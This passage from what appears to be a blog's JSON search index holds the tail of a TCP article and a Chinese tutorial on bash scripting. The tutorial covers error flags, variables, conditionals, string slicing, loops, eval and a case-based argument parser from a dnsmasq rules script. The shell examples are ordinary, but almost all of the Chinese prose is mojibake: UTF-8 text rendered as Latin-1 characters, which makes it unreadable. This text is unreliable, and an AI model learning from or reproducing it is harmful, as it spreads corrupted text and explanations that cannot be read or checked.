å¯¹äºblockingçš„writeæœ‰ä¸ªç‰¹ä¾‹ï¼šå½“writeæ­£é˜»å¡ç­‰å¾…æ—¶å¯¹é¢å…³é—­äº†socketï¼Œåˆ™writeåˆ™ä¼šç«‹å³å°†å‰©ä½™ç¼“å†²åŒºå¡«æ»¡å¹¶è¿”å›æ‰€å†™çš„å­—èŠ‚æ•°ï¼Œå†æ¬¡è°ƒç”¨åˆ™writeå¤±è´¥ï¼ˆconnection reset by peerï¼‰ æœ€åå¯ç¤ºå°±æ˜¯åº”ç”¨å±‚è¿›è¡Œå¼€å‘çš„æ—¶å€™ä¸è¦é›¶é›¶æ•£æ•£çš„å‘æ•°æ®ï¼Œå°½é‡æ”’æˆä¸€ä¸ªå¤§ä¸€ç‚¹çš„åŒ…å†å‘å‡ºå»ã€‚ä¸è¦è®©ç³»ç»Ÿå±‚å»åšè¿™ä»¶äº‹ã€‚TCP_NODELAY æ˜¯å¯ä»¥å…³é—­Nagleç®—æ³•çš„ todowindow congestionè¶…æ—¶é‡ä¼ é˜»å¡ï¼Œè¶…æ—¶ï¼Œ å‚è€ƒNagleå’ŒDelayed ACKä¼˜åŒ–ç®—æ³•åˆç”¨å¯¼è‡´çš„æ­»é”é—®é¢˜Nagleâ€™s Algorithm å’Œ Delayed ACK ä»¥åŠ Minshall çš„åŠ å¼·ç‰ˆå†è¯´TCPç¥å¥‡çš„40mstcpç¼“å†²éå¸¸å¥½çš„æ–‡ç« TCP çš„é‚£äº›äº‹å„¿ï¼ˆä¸‹ï¼‰","tags":[]},{"title":"å¦‚ä½•å†™shellè„šæœ¬","date":"2018-11-04T08:50:58.000Z","path":"2018/11/04/2018-11-04-how-to-write-shell-scripts/","text":"æ€»ç»“linuxä¸‹shellè„šæœ¬è¯­å¥çš„è¯­æ³•Shell æ˜¯ä¸€ä¸ªç”¨ C è¯­è¨€ç¼–å†™çš„ç¨‹åºï¼Œå®ƒæ˜¯ç”¨æˆ·ä½¿ç”¨ Linux çš„æ¡¥æ¢ã€‚Shell æ—¢æ˜¯ä¸€ç§å‘½ä»¤è¯­è¨€ï¼Œåˆæ˜¯ä¸€ç§ç¨‹åºè®¾è®¡è¯­è¨€ã€‚Shell æ˜¯æŒ‡ä¸€ç§åº”ç”¨ç¨‹åºï¼Œè¿™ä¸ªåº”ç”¨ç¨‹åºæä¾›äº†ä¸€ä¸ªç•Œé¢ï¼Œç”¨æˆ·é€šè¿‡è¿™ä¸ªç•Œé¢è®¿é—®æ“ä½œç³»ç»Ÿå†…æ ¸çš„æœåŠ¡ã€‚Ken Thompson çš„ sh æ˜¯ç¬¬ä¸€ç§ Unix Shellï¼ŒWindows Explorer æ˜¯ä¸€ä¸ªå…¸å‹çš„å›¾å½¢ç•Œé¢ Shellã€‚ Linux çš„ Shell ç§ç±»ä¼—å¤šï¼Œå¸¸è§çš„æœ‰ï¼š Bourne Shellï¼ˆ/usr/bin/shæˆ–/bin/shï¼‰ Bourne Again Shellï¼ˆ/bin/bashï¼‰ C Shellï¼ˆ/usr/bin/cshï¼‰ K Shellï¼ˆ/usr/bin/kshï¼‰ Shell for Rootï¼ˆ/sbin/shï¼‰â€¦â€¦ è¿™é‡Œè¯´çš„å¹¶ä¸æ˜¯ä¸¥æ ¼çš„posix complaint shellï¼Œå°±æ˜¯é‚£ç§åœ¨å„ç§unixç³»ç»Ÿä¸­éƒ½èƒ½è¿è¡Œçš„shellã€‚å› ä¸ºbashç”¨çš„æœ€å¹¿ï¼Œæ‰€ä»¥è¿™é‡Œä¸»è¦é’ˆå¯¹bashè¯­æ³•è¿›è¡Œè®²è§£ Shebangè„šæœ¬ä»¥Shebang)å¼€å§‹ &gt; #!/bin/sh #! æ˜¯ä¸€ä¸ªçº¦å®šçš„æ ‡è®°ï¼Œå®ƒå‘Šè¯‰ç³»ç»Ÿè¿™ä¸ªè„šæœ¬éœ€è¦ä»€ä¹ˆè§£é‡Šå™¨æ¥æ‰§è¡Œï¼Œå³ä½¿ç”¨å“ªä¸€ç§ Shellã€‚ è¿™æ ·çš„è¯chmod +X ä¹‹åç›´æ¥./xxx.shå°±å¯ä»¥æ‰§è¡Œäº† set -e å’Œset -xä»¥åŠpipe failç»å¸¸ä¼šåœ¨åˆ«äººçš„bashè„šæœ¬æœ€å‰é¢çœ‹åˆ°ä¸€è¡Œ set-eï¼šåœ¨é˜®ä¸€å³°è€å¸ˆçš„åšå®¢ä¸­æ‰¾åˆ°äº†è§£é‡Š #!/usr/bin/env bash set -e ## è¿™ä¸ªset -eçš„åŸå› ï¼Œå› ä¸ºbashä¸€èˆ¬å¯¹é”™è¯¯å®¹å¿åº¦æ¯”è¾ƒé«˜ï¼Œä¸€è¡Œå‘½ä»¤å‡ºäº†é”™è¿˜èƒ½å¾€ä¸‹èµ°ï¼Œå¯æ˜¯å®é™…ç”Ÿäº§ä¸­ï¼Œæˆ‘ä»¬å¸Œæœ›å‡ºäº†é”™å°±æ­¤æ‰“ä½ã€‚åœ¨æ–‡ä»¶å‰é¢å†™è¿™ä¸ªå°±è¡Œäº† ## æ€»æ¯”ä¸‹é¢è¿™äº›è¿™ä¹ˆå†™å¥½å§ command || exit 1 command || { echo &quot;command failed&quot;; exit 1; } set -eo pipefail ##set -eå¯¹äºç®¡é“æ— æ•ˆï¼Œè¿™ä¹ˆå†™å°±è¿ç®¡é“çš„é”™è¯¯éƒ½æ‹¦ä¸‹æ¥äº† $ set -eè¿™è¡Œä»£ç ä¹‹åçš„ä»»ä½•ä»£ç ï¼Œå¦‚æœè¿”å›ä¸€ä¸ªé0çš„å€¼ï¼Œé‚£ä¹ˆæ•´ä¸ªè„šæœ¬ç«‹å³é€€å‡ºï¼Œå®˜æ–¹çš„è¯´æ˜æ˜¯ä¸ºäº†é˜²æ­¢é”™è¯¯å‡ºç°æ»šé›ªçƒçš„ç°è±¡$ set -o pipefailåŸæ–‡è§£é‡Šå¦‚ä¸‹ï¼šIf set, the return value of a pipeline is the value of the last (rightmost) command to exit with a non-zero status,or zero if all commands in the pipeline exit successfully. This option is disabled by default.å¯ç†è§£ä¸ºï¼šå‘Šè¯‰ bash è¿”å›ä»å³åˆ°å·¦ç¬¬ä¸€ä¸ªä»¥é0çŠ¶æ€é€€å‡ºçš„ç®¡é“å‘½ä»¤çš„è¿”å›å€¼ï¼Œå¦‚æœæ‰€æœ‰å‘½ä»¤éƒ½æˆåŠŸæ‰§è¡Œæ—¶æ‰è¿”å›0$ set -x //è¿™å¥è¯èƒ½å¤Ÿåœ¨consoleä¸­æ˜¾ç¤ºå½“å‰è„šæœ¬æ‰§è¡Œäº†å“ªäº›è¯­å¥ shellä¸­å¼•ç”¨å˜é‡é¦–å…ˆå˜é‡æ˜¯éšä¾¿å®šä¹‰çš„ï¼Œå¼•ç”¨çš„æ—¶å€™å‰é¢åŠ ä¸€ä¸ªç¾å…ƒç¬¦å·å°±å¯ä»¥äº†ï¼ˆå˜é‡åä¸­ä¸èƒ½ç”¨ç ´æŠ˜å·-ï¼Œå¯ä»¥ç”¨_ï¼‰ ## MY_VAR=100 ## è¿™ä¸­é—´ä¸èƒ½æœ‰ç©ºæ ¼ ##ä¾‹ï¼šmyvar=â€œHi thereï¼â€ echo $myvar ## Hi thereï¼ echo &quot;$myvar&quot; ## Hi there! echo &#39; $myvar&#39; ## $myvar echo \\$myvar ## $myvar ## shellä¸­çš„å¤§æ‹¬å·æœ‰ç‚¹åƒjsçš„es6ä¸­çš„spread operator # ls {ex1,ex2}.sh ex1.sh ex2.sh # ls {ex{1..3},ex4}.sh ex1.sh ex2.sh ex3.sh ex4.sh # ls {ex[1-3],ex4}.sh ex1.sh ex2.sh ex3.sh ex4.sh å•å¼•å·é‡Œé¢çš„å˜é‡æ˜¯ä¸èƒ½è¾“å‡ºå˜é‡çš„å€¼çš„ï¼Œæ‰€ä»¥å°½é‡ç”¨åŒå¼•å· bashçš„å˜é‡æ˜¯æ— ç±»å‹çš„bashä¸­æ˜¯æ²¡æœ‰å˜é‡ç±»å‹çš„è¯´æ³•çš„ï¼Œä¾‹å¦‚a=1 è¿™å¥è¯ï¼Œä½ ä¸èƒ½è®¤ä¸ºaæ˜¯integerç±»å‹çš„ã€‚æœ¬è´¨ä¸Šæ¥è¯´ï¼ŒBashå˜é‡æ˜¯å­—ç¬¦ä¸²ï¼Œä½†æ˜¯æ ¹æ®ç¯å¢ƒçš„ä¸åŒï¼ŒBashå…è®¸å˜é‡æœ‰æ•´æ•°è®¡ç®—å’Œæ¯”è¾ƒã€‚å…¶ä¸­çš„å†³å®šå› ç´ æ˜¯å˜é‡çš„å€¼æ˜¯ä¸æ˜¯åªå«æœ‰æ•°å­—. $ a=2 $ echo &quot;$a + 1&quot; 2 + 1 //è¢«å½“æˆå­—ç¬¦ä¸²äº† $ echo &quot;$(($a + 1))&quot; 3 //è¢«å½“æˆæ•´æ•°äº† if elseè¿™ç§é€»è¾‘åˆ¤æ–­æ€ä¹ˆå†™ä¸¤ä¸ªæ•°å­—æ¯”è¾ƒæ˜¯å¦ç›¸ç­‰ï¼Œå¤§å°å…³ç³» #!/bin/bash a=10 b=6 if [ $a -eq 10 ]; then echo &quot;a == 10&quot; else echo &quot;not equal&quot; fi if (( $a &gt; $b )); then echo &quot;a greater than b &quot; fi if ($i&lt;5) ## å°æ‹¬å·é‡Œçš„ç›´æ¥æ‰§è¡Œå‘½ä»¤ if [ $i -lt 5 ] if [ $a -ne 1 -a $a != 2 ] ## -aè¡¨ç¤º&amp;&amp; if [ $a -ne 1] &amp;&amp; [ $a != 2 ] if [[ $a != 1 &amp;&amp; $a != 2 ]] ##&amp;&amp; || è¿™äº›ä¸œè¥¿éƒ½èƒ½å­˜åœ¨äºä¸¤ä¸ªä¸­æ‹¬å·é‡Œé¢ ä¸Šé¢è¿™ä¸ªä¾‹å­å°±æ˜¯ä¸¤ä¸ªå°æ‹¬å·çš„ä½“ç°äº†ï¼Œä¸¤ä¸ªå°æ‹¬å·$((exp))ä¸­ï¼ŒåŒæ‹¬å·ä¸­çš„å˜é‡å¯ä»¥ä¸ä½¿ç”¨$ç¬¦å·å¼•ç”¨,expè¢«ä½œä¸ºä¸€ä¸ªç®—æœ¯è¡¨è¾¾å¼åˆ¤æ–­ï¼Œæ¯”å¦‚ a=5; ((a++)) å¯å°† $a é‡å®šä¹‰ä¸º6 ä»¥ä¸‹åªé€‚ç”¨äºæ•°å€¼ä¹‹é—´çš„æ¯”è¾ƒ -eq ç­‰äº,å¦‚:if [ &quot;$a&quot; -eq &quot;$b&quot; ] -ne ä¸ç­‰äº,å¦‚:if [ &quot;$a&quot; -ne &quot;$b&quot; ] -gt å¤§äº,å¦‚:if [ &quot;$a&quot; -gt &quot;$b&quot; ] -ge å¤§äºç­‰äº,å¦‚:if [ &quot;$a&quot; -ge &quot;$b&quot; ] -lt å°äº,å¦‚:if [ &quot;$a&quot; -lt &quot;$b&quot; ] -le å°äºç­‰äº,å¦‚:if [ &quot;$a&quot; -le &quot;$b&quot; ] &lt; å°äº(éœ€è¦åŒæ‹¬å·),å¦‚:((&quot;$a&quot; &lt; &quot;$b&quot;)) &lt;= å°äºç­‰äº(éœ€è¦åŒæ‹¬å·),å¦‚:((&quot;$a&quot; &lt;= &quot;$b&quot;)) &gt; å¤§äº(éœ€è¦åŒæ‹¬å·),å¦‚:((&quot;$a&quot; &gt; &quot;$b&quot;)) &gt;= å¤§äºç­‰äº(éœ€è¦åŒæ‹¬å·),å¦‚:((&quot;$a&quot; &gt;= &quot;$b&quot;)) ä»¥ä¸‹é€‚ç”¨äºå­—ç¬¦ä¸²ä¹‹é—´çš„æ¯”è¾ƒï¼Œä¹Ÿå¯ç”¨äºæ•°å€¼æ¯”è¾ƒ= ç›¸ç­‰åˆ™ä¸ºçœŸ!= ä¸ç›¸ç­‰åˆ™ä¸ºçœŸ åˆ¤æ–­ä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰ if [ &quot;$var1&quot; == &quot;$var2&quot; ]; then ##if åé¢å¿…é¡»åŠ then echo &#39;$var1 eq $var2&#39; else echo &#39;$var1 not eq $var2&#39; fi åˆ¤æ–­ä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ä¸ç›¸ç­‰ if [ &quot;$a&quot;x != &quot;$b&quot;x ]; then echo &quot;$a not equals $b&quot; else echo &quot;$a equals $b&quot; fi åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦ä¸ºç©ºæ–¹æ³•ä¸€ï¼š if [ -z &quot;$d&quot; ] then echo &quot;d is empty&quot; fi æ–¹æ³•äºŒï¼š-n str1 å½“å­—ç¬¦ä¸²çš„é•¿åº¦å¤§äº0æ—¶ä¸ºçœŸ(ä¸²éç©º) str1 = str2 å½“ä¸¤ä¸ªå­—ç¬¦ä¸²æœ‰ç›¸åŒå†…å®¹ã€é•¿åº¦æ—¶ä¸ºçœŸstr1 != str2 å½“å­—ç¬¦ä¸²str1å’Œstr2ä¸ç­‰æ—¶ä¸ºçœŸ -z str1 å½“å­—ç¬¦ä¸²çš„é•¿åº¦ä¸º0æ—¶ä¸ºçœŸ(ç©ºä¸²)str1 å½“å­—ç¬¦ä¸²str1ä¸ºéç©ºæ—¶ä¸ºçœŸ å­—ç¬¦ä¸²myStringæ˜¯å¦åŒ…å«å­—ç¬¦ä¸²my string=&#39;My long string&#39; if [[ $string == *&quot;My long&quot;* ]]; then echo &quot;It&#39;s there!&quot; fi æ–‡ä»¶æˆ–è€…ç›®å½•ç›¸å…³æ“ä½œ ## æ–‡ä»¶ä¸å­˜åœ¨ if [ ! -f /etc/nonexisitfile ]; then echo &quot;file not exists&quot; fi ## æ–‡ä»¶å­˜åœ¨ if [ -f /etc/rc.local ]; then //-fæ˜¯è¢«æµ‹æ–‡ä»¶æ˜¯ä¸€ä¸ªregularæ–‡ä»¶ï¼ˆæ­£å¸¸æ–‡ä»¶ï¼Œéç›®å½•æˆ–è®¾å¤‡ï¼‰ echo &quot;file exists&quot; fi if [ -d /usr/bin ]; then echo &quot;folder exists&quot; fi if [ ! -f /usr/bin ]; then echo &quot;folder cannot use -f&quot; // æ–‡ä»¶ä¸å­˜åœ¨ fi if [ -s /usr/bin ]; then echo &quot;folder can use -s&quot; //æ–‡ä»¶å­˜åœ¨ fi if [ -r /usr/bin/watch ]; then echo &quot;i can read this file&quot; //å¯è¯»æƒé™ fi if [ ! -w /usr/bin/watch ]; then echo &quot;i can not write this file&quot; //å¯å†™æƒé™ fi //æ–‡ä»¶å¤¹ä¸ºç©º if [ &quot;$(ls -A /usr/bin)&quot; ]; then echo &quot;this directory is not empty &quot; else echo &quot;this directory is empty&quot; fi -r file ç”¨æˆ·å¯è¯»ä¸ºçœŸ-w file ç”¨æˆ·å¯å†™ä¸ºçœŸ-x file ç”¨æˆ·å¯æ‰§è¡Œä¸ºçœŸ-f file æ–‡ä»¶ä¸ºæ­£è§„æ–‡ä»¶ä¸ºçœŸ-d file æ–‡ä»¶ä¸ºç›®å½•ä¸ºçœŸ-c file æ–‡ä»¶ä¸ºå­—ç¬¦ç‰¹æ®Šæ–‡ä»¶ä¸ºçœŸ-b file æ–‡ä»¶ä¸ºå—ç‰¹æ®Šæ–‡ä»¶ä¸ºçœŸ-s file æ–‡ä»¶å¤§å°é0æ—¶ä¸ºçœŸ-t file å½“æ–‡ä»¶æè¿°ç¬¦(é»˜è®¤ä¸º1)æŒ‡å®šçš„è®¾å¤‡ä¸ºç»ˆç«¯æ—¶ä¸ºçœŸ ä¸€ä¸ªè·å–å½“å‰æ–‡ä»¶è·¯å¾„çš„æ–¹å¼HERE=$(cd â€œ$(dirname â€œ$0â€)â€ &amp;&amp; pwd) åˆ¤æ–­nginxæ˜¯å¦åœ¨è¿è¡Œï¼Œæ²¡æœ‰è¿è¡Œçš„è¯æ‹‰èµ·æ¥ #!/bin/sh set -e SERVICE=&quot;nginx&quot; if pgrep -x &quot;$SERVICE&quot; &gt;/dev/null then echo &quot;$SERVICE is running&quot; else echo &quot;$SERVICE stopped&quot; # uncomment to start nginx if stopped systemctl start nginx # mail fi #if [ $(ps -ef | grep -c &quot;ssh&quot;) -gt 1 ]; then echo &quot;true&quot;; fi æ£€æŸ¥ä¸‹å½“å‰æ˜¯å¦å®‰è£…äº†git if ! [ -x &quot;$(command -v git)&quot; ]; then ## commandè¿™ä¸ªå…³é”®å­—æ˜¯posix compatibleçš„ echo &#39;Error: git is not installed.&#39; &gt;&amp;2 exit 1 fi åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨æŸä¸€ä¸ªå•è¯ï¼Œå¦‚æœå­˜åœ¨çš„è¯æ‰§è¡ŒæŸé¡¹task if grep -q keyword /var/somefile ; then ##è¿™ä¸ª-qåªæ˜¯é¿å…grepè¾“å‡ºæ‰¾å‡ºæ¥çš„stringï¼Œæˆ‘ä»¬åªéœ€è¦çŸ¥é“å®ƒçš„è¿”å›å€¼æ˜¯æˆåŠŸè¿˜æ˜¯å¤±è´¥ echo &quot;file contain that word&quot; fi æŸ¥çœ‹æŸä¸ªå‘½ä»¤çš„è¾“å‡ºä¸­æœ‰æ²¡æœ‰æŸä¸ªå…³é”®å­—ï¼Œæœ‰çš„è¯æ‰§è¡Œæ“ä½œ OUTPUT=&#39;blah blah (Status: 200)&#39; if echo &quot;$OUTPUT&quot; | grep -q &quot;(Status:\\s200)&quot;; then echo &quot;MATCH&quot; fi ä¸ï¼Œæˆ–ï¼Œéæ“ä½œif [ ${OUT_FILE}a != ${OUT_FILE%/*}a ] &amp;&amp; [ ! -d ${OUT_FILE%/*} ]; then ## ç”¨&amp;&amp; å°±å¯ä»¥äº† _red &#39;Error: Folder do not exist: &#39;${OUT_FILE%/*}&#39;\\n&#39; exit 1 fi -a ä¸-o æˆ–! é å­—ç¬¦ä¸²ç›¸å…³å‡½æ•°#!/bin/bashbash echo &quot;hello there&quot; foo=&quot;Hello&quot; foo=&quot;$foo World&quot; ## æ‹¼æ¥ä¸€ä¸ªç°æˆçš„stringåˆ°å¦ä¸€ä¸ªstringçš„å°¾éƒ¨ï¼Œç”¨å†’å·è·Ÿç¾å…ƒç¬¦å·å°±å¥½äº† echo $foo echo &quot;Number of files in this directory: `ls | wc -l`&quot; ## ä½†æ˜¯å°†ls | wc -lçš„è¾“å‡ºä½œä¸ºä¸€ä¸ªStringæ‹¼æ¥åˆ°ä¸€ä¸ªstringä¸­ï¼Œç”¨å•å¼•å· echo &quot;all the files under the directory `ls /usr/*/g* | head -n3`&quot; æƒ³è¦åœ¨bashä¸­è®¾ç½®ä¸€ä¸ªvariableä¸ºä¸€ä¸ªå‘½ä»¤çš„è¾“å‡º #!/bin/bash OUTPUT=&quot;$(ls -1)&quot; ## æ³¨æ„ï¼Œè¿™é‡Œç­‰äºå·å‰åä¸èƒ½æœ‰ç©ºæ ¼ echo &quot;${OUTPUT}&quot; ##é‚£å¦‚æœå°±æ˜¯å¹³æ—¶åœ¨terminalé‡Œé¢éšä¾¿æ•²æ•²å‘¢ï¼Œä¸‹é¢è¿™äº›äº²æµ‹æ— è¯¯ echo &quot;$(ls -al | wc)&quot; &quot;$(which java)&quot; -h ## æ¯”å¦‚è¯´æˆ‘æƒ³æŠŠjavaçš„è·¯å¾„å¡«å……åˆ°ä¸€æ®µå‘½ä»¤ä¸­é—´ echo &quot;$(which java)&quot;/something &gt;&gt; /usr/bin/java/something java=&quot;$(which java)&quot; ${java} --version å­—ç¬¦ä¸²é•¿åº¦string=&quot;abcd&quot; ## æŸ¥æ‰¾å­—ç¬¦ i æˆ– o çš„ä½ç½®(å“ªä¸ªå­—æ¯å…ˆå‡ºç°å°±è®¡ç®—å“ªä¸ª)ï¼š string=&quot;home is a great site&quot; echo `expr index &quot;$string&quot; io` # è¾“å‡º 2 echo ${äº•å·string} ##è¾“å‡º 4, è¿™ä¹ˆå†™çš„åŸå› å®Œå…¨æ˜¯hexoç¢°åˆ°ç¾å…ƒ+å¤§æ‹¬å·+äº•å·æ¸²æŸ“ä¸å‡ºæ¥ å­—ç¬¦ä¸²æˆªå–(é™¤äº†awkä»¥å¤–)var=/home/centos echo $var echo ${var:5} ## æå–ä»ä»é›¶å¼€å§‹ç¬¬5ä¸ªå­—ç¬¦åˆ°æœ«å°¾çš„å…¨éƒ¨å­—ç¬¦ï¼Œ è¾“å‡ºï¼š /centos echo ${var: -6} ##æ³¨æ„-6å‰é¢éœ€è¦æœ‰ä¸€ä¸ªç©ºæ ¼ã€‚æå–ä»å€’æ•°ç¬¬6ä¸ªå­—ç¬¦(å«ç¬¬å…­ä¸ª)å¼€å§‹åˆ°æœ«å°¾çš„å…¨éƒ¨å­—ç¬¦ ï¼Œ è¾“å‡º: centos echo ${var:(-6)} ## å’Œä¸Šé¢ä¸€æ ·ï¼Œåªæ˜¯ä¸éœ€è¦ç©ºæ ¼äº†ã€‚è¾“å‡º :centos echo ${var:1:4} ## æˆªå–ç¬¬ä¸€ä¸ªåˆ°ç¬¬å››ä¸ªå­—ç¬¦ä¹‹é—´æ‰€æœ‰å­—ç¬¦,è¾“å‡º: home echo ${var/o/h} ## æŠŠç¬¬ä¸€ä¸ªåŒ¹é…åˆ°çš„oæ¢æˆhï¼Œè¾“å‡º: /hhme/centos echo ${var//o/h} ## æŠŠæ‰€æœ‰åŒ¹é…åˆ°çš„oæ¢æˆhï¼Œè¿™ä¸ªå’Œsedéå¸¸åƒ è¾“å‡º /hhme/cenths var=&quot;pid: 1234&quot; var=${var:5} ## è¾“å‡º1234ï¼Œåˆ‡æ‰å‰5ä¸ªå­—ç¬¦ ç”¨cutä¹Ÿè¡Œ echo &#39;someletters_12345_moreleters.ext&#39; | cut -d&#39;_&#39; -f 2 12345 evalçš„ç”¨æ³•eval ç›¸å½“äºä¸€ä¸ªå‚æ•°æ›¿æ¢å™¨ï¼Œå®ƒä¼šæŠŠæ‰€æœ‰ $å¼€å¤´çš„å˜é‡ è¿›è¡Œæ±‚å€¼æ›¿æ¢ï¼Œç„¶åæŠŠæ›¿æ¢åçš„ç»“æœå½“ä½œä¸€æ¡å‘½ä»¤æ¥æ‰§è¡Œã€‚jså’Œpythonä¸­ä¹Ÿæœ‰ç±»ä¼¼çš„å‘½ä»¤ #!/bin/bash CD=&quot;cd Desktop&quot; eval $CD ##ç›¸å½“äºæ‰§è¡Œäº†ä¸Šé¢å­—ç¬¦ä¸²å¯¹åº”çš„å‘½ä»¤ æµç¨‹æ§åˆ¶(forå¾ªç¯å’Œwhileå¾ªç¯)for file in `ls /etc` ##æˆ– for file in $(ls /etc) for str in &quot;a b c&quot; //ç”¨ç©ºæ ¼åˆ†å‰² æ•°ç»„éå†ï¼Œä¸‹æ ‡ï¼Œé•¿åº¦ç­‰ç­‰å†™æˆä¸€è¡Œä¹Ÿæ˜¯å¯ä»¥çš„ distro=(&quot;redhat&quot; &quot;debian&quot; &quot;gentoo&quot;) len=&lt;code&gt;${&lt;/code&gt;#distro[@]} for (( i=0; i&lt;$len; i++ )); do echo &quot;${distro[$i]}&quot; ; done array_name=(value0 value1 value2 value3) echo ${array_name[@]} ## ä½¿ç”¨@æ‰èƒ½è·å¾—æ•°ç»„çš„å…¨éƒ¨å…ƒç´  value0 value1 value2 value3 ç®€å•çš„å¾ªç¯ï¼ˆfor eachå¾ªç¯ï¼‰#!/bin/bash i=0; while [ $i -lt 4 ]; do echo $i; i=`expr $i + 1`; # let i+=1; //è¿™äº›éƒ½æ˜¯è®©iè‡ªå¢çš„æ–¹å¼ # ((i++)); # i=$[$i+1]; # i=$(( $i + 1 )) done ##forå¾ªç¯æœ‰å¾ˆå¤šç§å†™æ³•ï¼Œçœ‹åˆ°çš„æ—¶å€™æ³¨æ„å°±æ˜¯äº† for j in $(seq 1 5) do echo $j done for((i=0;i&lt;10;i++)); do echo &quot;current num is$i\\n\\n&quot; done for j in $(seq 1 5) do echo $j done for j in {0..10} do echo &quot;j = $j&quot; done ## è¿˜å¯ä»¥å†™æˆä¸€è¡Œ for f in *.txt; do grep &quot;tasks:&quot; $f switch caseçš„ä¾‹å­æ‰¾äº†ä¸€ä¸ªç°æˆçš„get_args(){ OUT_TYPE=&#39;DNSMASQ_RULES&#39; DNS_IP=&#39;127.0.0.1&#39; DNS_PORT=&#39;5353&#39; IPSET_NAME=&#39;&#39; FILE_FULLPATH=&#39;&#39; CURL_EXTARG=&#39;&#39; WGET_EXTARG=&#39;&#39; WITH_IPSET=0 EXTRA_DOMAIN_FILE=&#39;&#39; EXCLUDE_DOMAIN_FILE=&#39;&#39; IPV4_PATTERN=&#39;^((2[0-4][0-9]|25[0-5]|[01]?[0-9][0-9]?)\\.){3}(2[0-4][0-9]|25[0-5]|[01]?[0-9][0-9]?)$&#39; IPV6_PATTERN=&#39;^((([0-9A-Fa-f]{1,4}:){7}([0-9A-Fa-f]{1,4}|:))|(([0-9A-Fa-f]{1,4}:){6}(:[0-9A-Fa-f]{1,4}|((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])(\\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])){3})|:))|(([0-9A-Fa-f]{1,4}:){5}(((:[0-9A-Fa-f]{1,4}){1,2})|:((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])(\\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])){3})|:))|(([0-9A-Fa-f]{1,4}:){4}(((:[0-9A-Fa-f]{1,4}){1,3})|((:[0-9A-Fa-f]{1,4})?:((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])(\\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])){3}))|:))|(([0-9A-Fa-f]{1,4}:){3}(((:[0-9A-Fa-f]{1,4}){1,4})|((:[0-9A-Fa-f]{1,4}){0,2}:((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])(\\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])){3}))|:))|(([0-9A-Fa-f]{1,4}:){2}(((:[0-9A-Fa-f]{1,4}){1,5})|((:[0-9A-Fa-f]{1,4}){0,3}:((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])(\\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])){3}))|:))|(([0-9A-Fa-f]{1,4}:){1}(((:[0-9A-Fa-f]{1,4}){1,6})|((:[0-9A-Fa-f]{1,4}){0,4}:((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])(\\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])){3}))|:))|(:(((:[0-9A-Fa-f]{1,4}){1,7})|((:[0-9A-Fa-f]{1,4}){0,5}:((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])(\\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])){3}))|:)))(%.+)?$&#39; while [ ${#} -gt 0 ]; do case &quot;${1}&quot; in --help | -h) usage 0 ;; --domain-list | -l) OUT_TYPE=&#39;DOMAIN_LIST&#39; ;; --insecure | -i) CURL_EXTARG=&#39;--insecure&#39; WGET_EXTARG=&#39;--no-check-certificate&#39; ;; --dns | -d) DNS_IP=&quot;$2&quot; shift ;; --port | -p) DNS_PORT=&quot;$2&quot; shift ;; --ipset | -s) IPSET_NAME=&quot;$2&quot; shift ;; --output | -o) OUT_FILE=&quot;$2&quot; shift ;; --extra-domain-file) EXTRA_DOMAIN_FILE=&quot;$2&quot; shift ;; --exclude-domain-file) EXCLUDE_DOMAIN_FILE=&quot;$2&quot; shift ;; *) _red &quot;Invalid argument: $1&quot; usage 1 ;; esac shift 1 done # Check path &amp; file name if [ -z $OUT_FILE ]; then _red &#39;Error: Please specify the path to the output file(using -o/--output argument).\\n&#39; exit 1 else if [ -z ${OUT_FILE##*/} ]; then ## -zè¡¨ç¤ºå­—ç¬¦ä¸²çš„é•¿åº¦ä¸º0,-nä¸ºå¤§äº0 _red &#39;Error: &#39;$OUT_FILE&#39; is a path, not a file.\\n&#39; exit 1 else if [ ${OUT_FILE}a != ${OUT_FILE%/*}a ] &amp;&amp; [ ! -d ${OUT_FILE%/*} ]; then _red &#39;Error: Folder do not exist: &#39;${OUT_FILE%/*}&#39;\\n&#39; exit 1 fi fi fi if [ $OUT_TYPE = &#39;DNSMASQ_RULES&#39; ]; then # Check DNS IP IPV4_TEST=$(echo $DNS_IP | grep -E $IPV4_PATTERN) IPV6_TEST=$(echo $DNS_IP | grep -E $IPV6_PATTERN) if [ &quot;$IPV4_TEST&quot; != &quot;$DNS_IP&quot; -a &quot;$IPV6_TEST&quot; != &quot;$DNS_IP&quot; ]; then _red &#39;Error: Please enter a valid DNS server IP address.\\n&#39; exit 1 fi # Check DNS port if [ $DNS_PORT -lt 1 -o $DNS_PORT -gt 65535 ]; then _red &#39;Error: Please enter a valid DNS server port.\\n&#39; exit 1 fi # Check ipset name if [ -z $IPSET_NAME ]; then WITH_IPSET=0 else IPSET_TEST=$(echo $IPSET_NAME | grep -E &#39;^\\w+$&#39;) if [ &quot;$IPSET_TEST&quot; != &quot;$IPSET_NAME&quot; ]; then _red &#39;Error: Please enter a valid IP set name.\\n&#39; exit 1 else WITH_IPSET=1 fi fi fi if [ ! -z $EXTRA_DOMAIN_FILE ] &amp;&amp; [ ! -f $EXTRA_DOMAIN_FILE ]; then _yellow &#39;WARNING:\\nExtra domain file does not exist, ignored.\\n\\n&#39; EXTRA_DOMAIN_FILE=&#39;&#39; fi if [ ! -z $EXCLUDE_DOMAIN_FILE ] 